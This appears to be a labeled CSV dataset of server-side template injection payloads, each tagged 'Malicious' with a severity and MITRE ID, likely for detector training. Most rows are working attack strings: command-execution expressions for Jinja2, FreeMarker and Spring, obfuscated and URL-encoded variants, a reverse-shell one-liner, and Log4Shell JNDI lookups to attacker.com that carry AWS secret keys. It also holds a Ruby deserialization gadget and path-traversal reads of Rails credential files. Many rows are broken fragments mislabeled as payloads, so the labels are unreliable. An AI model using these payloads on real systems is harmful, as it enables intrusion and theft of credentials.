",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{2*2}}[[3*3]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*'3'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 3 * 3 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${6*6},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(6+5),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 3 * 3 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
*{7*7},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{app.request.server.all|join('","')}}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}} ,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B3%2A3%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B3%2A%273%27%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B6%2A6%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B%7B3%2A3%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%40%286%2B5%29%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%23%7B3%2A3%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%23%7B%203%20%2A%203%20%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bdump%28app%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20request%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bself%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%24smarty.version%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest.__class__%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{2*2}}[[3*3]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*'3'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 3 * 3 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${6*6},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(6+5),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 3 * 3 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{app.request.server.all|join(',')}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{php}echo """,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
        injection_entry += """"{{INJECTION_POINT}}/""""  # It will be renderred later with the payload.""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"    testing_url = testing_url.replace(""{{INJECTION_POINT}}"", payload)",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"path = ""../../../../../../../../../../config/credentials.yml.enc{{""",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
"path = ""../../../../../../../../../../config/master.key{{""",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
"            req['Accept'] = ""../../../../../../../../../../tmp/result.txt{{""",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${java:version}.domain/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${env:JAVA_VERSION}.domain/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${sys:java.version}.domain/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${sys:java.vendor}.domain/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${hostName}.domain/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:dns://${hostName}.domain},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3+3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"""healthCheckRegistry"": ""ldap://{{interactsh-url}}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"    """,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([""0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446""].pack(""H*"")) rescue nil'; done",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
curl -H 'Referer: {{readFile """"etc/passwd""""}}' http://localhost/""",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
${7*7},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{7*7}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${class.getClassLoader()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${class.getResource("""").getPath()}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${class.getResource(""../../../../../index.htm"").getContent()}",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${dwf.newInstance(ec,null)(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}} would result in 'A',SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
